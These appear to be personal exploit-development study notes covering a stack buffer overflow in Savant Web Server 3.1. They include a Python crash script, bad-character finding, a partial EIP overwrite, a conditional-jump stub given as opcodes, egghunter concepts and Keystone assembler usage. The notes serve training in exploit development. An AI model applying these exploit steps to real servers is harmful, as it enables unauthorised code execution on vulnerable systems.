Some exploits do not leave sufficient exploit space to write shellcode. However, it's sometimes possible to write code to other parts of program memory that can be referenced by the limited exploit space.
- Space Restrictions
- Bad Characters
- Partial Instruction Pointer Overwrite

# Savant Web Server 3.1 Exploit
First, we get the server to crash. (Pre-installed on Windows client). Reference https://www.cvedetails.com/cve/CVE-2002-1120/

### Cause a Crash
1. Attach WinDbg to a Savant process
2. Create and run a python exploit 
```
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 80
  size = 260

  httpMethod = b"GET /"
  inputBuffer = b"\x41" * size
  httpEndRequest = b"\r\n\r\n"

  buf = httpMethod + inputBuffer +  httpEndRequest

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
3. Trigger access violation, and immediately gaining EIP control

### Crash Analysis
Typically ESP points to our controlled buffer, where we can store shellcode, and would have a jump instruction like JMP ESP that would give us access to EIP
In this case, ESP points to our controlled buffer, but we only have 3 bytes for our shellcode.
> An attempt to increase the buffer size ends up changing the crash and losing EIP control

- The buffer is also null-byte terminated, meaning it is probably stored as a string (important).
- The 2nd DWORD on the stack points very close to our buffer (`03e0ea84` vs `03e0ea2c`)
- `dc` (dump with ASCII) on this address shows the GET request, some null bytes, then the A's

### Detect Bad Characters
Same process as usual, but in this exploit the program will not crash (not reach 260 bytes in length) if there is a bad char in the buffer. As a result, we should comment out blocks of lines and rerun to determine where the crash is happening (since we can view debugger output).
- Start with half, then narrow down to the line level, if there is a crash, then the uncommented lines are all good chars, else inspect char by char (tedious af)
- badchars = `0x00, 0x0A, 0x0D, 0x25`

# Gaining Code Execution
1. Determine exact offset of the EIP overwrite
	1. msf-pattern_create didn't work here due to changing the nature of the overflow... need to try manually (binary split search)
 2. Find an instruction to jump to with `.load narly` -> `!nmod`
 3. But we find that the only module included with the program is Savant itself, and it is preceded with a null byte, meaning it would break the exploit
### Partial EIP Overwrite
Remember how our value on the stack was null terminated? We can leverage that to reach Savant modules located in the 00XXXXXX range
1. Change script to only overwrite the first three bytes : `input buffer += b'\x60\x60\x60`, removing anything post EIP buffer as well
2. Locate an instruction in Savant code space that will jump to controllable overflow space.
	1. We don't have any space after our instruction on the stack (where ESP points), but the second value on the stack still points to the top of our input (the GET and subsequent overflow)
	2. This requires a POP 32, RET
	3. First we inspect the unassembled code at that address (the GET) to see if it will break the exploit, it does at `add byte ptr [eax],al` since EAX is the address 0x00000000.
	4. But, we can try to specifically pop the extra value from the stack into EAX to make it a valid address. (POP EAX, RET)
	5. `lm m savant` -> `s ADDR_START ADDR_END 58 C3`, using `msf-nasm_shell` to determine the opcodes 58 and C3 
	6. Input address of instruction into exploit code `inputBuffer += pack('<L', (ADDR_NO_0's))`
	7. `bp ADDR` : and test the new exploit, stepping through to ensure there are no access violation... but there is on a later `byte ptr [edi],ch` instruction :(

### Changing the HTTP Method
Taking a step back, we analyze the buffer where we are returning to, our HTTP GET, with `dc esp`. GET is post padded with a bunch of nulls up to a fixed length, showing that there is extra space to work with, but also suggesting that the HTTP method is never actually checked. 
We could place a short jump in its place to get to our buffer
- `nasm> jmp short XX` 
- Edit GET buffer in exploit with short jump opcode
- Set `bp`,  try the exploit, and `dc poi(@esp)` right before the return, (or just `t` through) but we realize that the jmp instruction was mangled and came in as `cb` instead of `eb`
> 	Even though we tested bad chars earlier, input can be checked and managed differently in the program depending on which section of memory you are writing to, in this case the HTTP method is checked differently

### Using Conditional Jump
Since the traditional short jump doesn't work, lets try a conditional jump instruction. For this specific case, we'll use JE (also called JZ) which checks the ZF flag. The ZF flag is the "zero flag" and will be set to 1 on a TEST instruction (and others) if the arithmetic being tested equals 0
- In reverse order, we need to jump if ZF is 1, test arithmetic to ensure ZF is 1, set a register to control our test conditions. An instruction flow that matches this would be : 
	- `xor ecx, ecx` : zero's out ECX (we could use any register)
	- `test ecx, ecx` : sets the ZF to 1
	- `je 0x15` : jumps 15 bytes if ZF
1. Run this through `msf-nasm_shell` and check for any bad characters, we see none except the nulls at the end of the jump. This isn't a problem though since the program will append null bytes for us anyway, so we can just leave them off.
2. Put into exploit script : `b'\x31\xc9\x85\xc9\x0f\x84\x0f + ' /'`. Be SURE to include the space before the '/' as this denotes the end of what would be the GET request
3. `bp` at the return instruction and run again, `u poi(@esp)` before the return to check if the instructions loaded correctly, and `r @zf` before the jump to ensure the condition is right
4. Take the jump and `u @eip` to ensure we ended up in the buffer space
5. `db @eip L100` -> `? FINAL_ROW_ADDR + LAST_CHAR_HEX_OFFSET - @eip` : which returns the amount of space for shellcode, in this case 251

# Egghunting (Finding Alternative Buffers)
Since 251 bytes is not enough for a robust shellcode, we look into ways to extend the buffer sent to the application
- Attempt 1, sending a large buffer in the body of the HTTP request (ie. add buffer after a `/r/n` then follow it with a `/r/n/r/n`.). This fails and the application doesn't crash or the crash changes.
- Attempt 2, send a large buffer after the HTTP request (after a `/r/n/r/n`), this succeeds, but it ends up somewhere besides our controllable stack. This is workable.
With this buffer, we prepend an identifiable string, an "egg", that we can then search the program memory space with `s -a 0x0 L?80000000 babu_was_here` 

### The Heap
- The address returned by the egg is not in our current stack. Its on the heap, as seen with `!address ADDRESS` extension in WinDbg
Processes can request heap space through the Windows heap manager by use of API calls like HeapAlloc, HeapFree, etc. These then call into native Windows function in `ntdll.dll`.
All processes get a new "Default Process Heap" at start, but new heaps can be requested by the process at runtime (through the heap API or with C calls malloc / free). This implementation is called NT Heap.
The heap is all dynamically allocated memory, so **our buffer space cannot be determined before run time**

### Egghunter
Egghunter : a stage one payload that searches for a static string (the egg) in Virtual Address Space (VAS), then jumps to that address.
Egghunters must be small to fit as a stage 1, fast to prevent process hanging, and robust to handle access violations. 
One way to build egghunter logic is to write the assembly, compile it, then open the program in IDA to get the opcodes. But this is tedious when constant corrections are needed. 

### Keystone Engine
Now introducing <u><b>the Keystone Engine</b></u> : an assembler framework allowing us to write assembly code in a python script (or other language) and have it compile directly to machine code.
Install instructions here: https://github.com/keystone-engine/keystone/blob/master/docs/COMPILE-NIX.md
https://www.keystone-engine.org/docs/
terminal usage: `kstool x32 "add eax, ebx"`
python usage:
```
from keystone import *
CODE = (
	"start:
		xor eax, eax;
		...
		pop esi;"
)
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
instructions = ""
# \\x{0:02x} -> print '\x' literally, followed by a 0 pre-padded, 2 digit width, hex value
for dec in encoding:
	instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")
print("Opcodes = (\"" + instructions + "\")")
```
[[LESSON]] : don't name your file `keystone.py` as this is the library name...
After producing shellcode with one of these tools, it can be verified with msf-nasm_shell


### Egghunter Example
`NTAccessCheckAndAuditAlarms` : a Windows system call that we abuse to check for access violations and handle cleanly using native Windows kernel methods. Returns either `STATUS_ACCESS_VIOLATION` if invalid or `STATUS_NO_IMPERSONATION_TOKEN` if valid
[[Egghunter Example]]
